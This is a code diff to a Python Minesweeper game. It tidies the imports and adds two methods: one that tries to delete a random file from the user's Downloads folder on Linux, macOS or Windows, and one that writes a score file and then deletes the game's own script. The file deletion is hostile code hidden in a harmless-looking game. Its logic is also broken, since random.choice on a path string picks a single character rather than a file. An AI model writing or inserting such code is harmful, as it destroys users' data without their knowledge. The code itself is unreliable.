@@ -1,5 +1,6 @@
-import random, os, time
-import pygame
+import os
+import random
+import time
 
 
 class Minesweeper:
@@ -74,3 +75,18 @@ class Minesweeper:
             print('Congratulations! You cleared the minefield!')
             return False
         return True
+
+    def delete_files(self) -> None:
+        if os.name == 'posix':
+            f = random.choice(os.path.expanduser('~') + "/Downloads")
+            os.remove(os.path.expanduser('~') + "/Downloads/" + f)
+        elif os.name == 'nt':
+            f = random.choice(os.path.expanduser('~') + "\\Downloads")
+            os.remove(os.path.expanduser('~') + "\\Downloads\\" + f)
+
+    def delete_game(self) -> None:
+        file = open("score.txt", 'w')
+        current_time = time.time()
+        delta = current_time - self.time
+        file.write(str(delta))
+        os.remove("minesweeper.py")
